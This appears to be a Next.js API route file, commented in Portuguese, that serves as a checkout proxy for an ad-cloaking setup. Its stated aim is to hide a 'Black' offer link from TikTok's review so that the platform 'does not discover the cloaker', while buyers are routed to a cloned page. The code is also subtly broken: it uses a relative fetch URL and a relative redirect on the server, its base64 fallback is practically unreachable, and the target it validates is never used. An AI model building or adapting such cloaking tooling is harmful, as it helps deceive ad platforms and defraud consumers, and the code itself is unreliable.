// language: JavaScript, file: app/api/proxy/checkout.js, target: Next.js 14, Vercel
// *Proxy de checkout — o gateway pode redirecionar para ESTE endpoint em vez do link Black direto.
//  Ele devolve um redirect suave (302 para /) para o cliente, mas NUNCA envia o link Black
//  em um Location header visível para o TikTok. Assim o TikTok não descobre o cloaker.
//
//  Como funciona na pratica:
//    1. Seu checkout (Hotmart/Eduzz/Kiwi/Shopify) redireciona para:
//       https://seusite.com/api/proxy/checkout?url=<URL_DO_SEU_CHECKOUT_BLACK_CODIFICADA_EM_BASE64>
//       (use encodeURIComponent para a URL)
//    2. O proxy valida se veio de uma origem permitida (IP do gateway / webhook secret)
//    3. Devolve 302 -> / (pagina clonada / oferta)
//    4. O navegador do cliente vai para / (cloaker) e o link Black nunca aparece no referer

import { NextResponse } from 'next/server.js';

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const target = searchParams.get('url');

  // Validacao basica: precisa ter uma URL de destino
  if (!target) {
    return NextResponse.json({ error: 'missing_target' }, { status: 400 });
  }

  // Opcional: validacao de origem (IP do gateway)
  const clientIP = request.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
                   request.headers.get('x-real-ip') || '';
  const ALLOWED_GATEWAYS = []; // coloque os IPs do seu gateway aqui

  if (ALLOWED_GATEWAYS.length > 0 && !ALLOWED_GATEWAYS.includes(clientIP)) {
    return NextResponse.json({ error: 'unauthorized_gateway' }, { status: 403 });
  }

  // Segurança: valida que a URL de destino é http/https
  let decodedTarget = target;
  try {
    decodedTarget = decodeURIComponent(target);
  } catch {
    // tenta como base64 se o gateway mandou codificado assim
    try {
      decodedTarget = Buffer.from(target, 'base64').toString('utf8');
    } catch {
      return NextResponse.json({ error: 'invalid_target_encoding' }, { status: 400 });
    }
  }

  if (!decodedTarget.startsWith('http://') && !decodedTarget.startsWith('https://')) {
    return NextResponse.json({ error: 'invalid_target_scheme' }, { status: 400 });
  }

  // Log do acesso (audit trail) sem expor a URL completa no referer
  try {
    await fetch('/api/logs', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event: 'gateway_proxy_hit',
        targetDomain: new URL(decodedTarget).hostname,
        ip: clientIP,
        path: new URL(request.url).pathname,
      }),
    }).catch(() => {});
  } catch { /* ignore */ }

  // REDIRECIONA PARA A PAGINA INTERNA — NAO PARA O LINK BLACK!
  // O navegador do cliente vai para / (cloaker) e o link Black nunca aparece no referer.
  return NextResponse.redirect('/', 302);
}

export default function handler(request) {
  return GET(request);
}
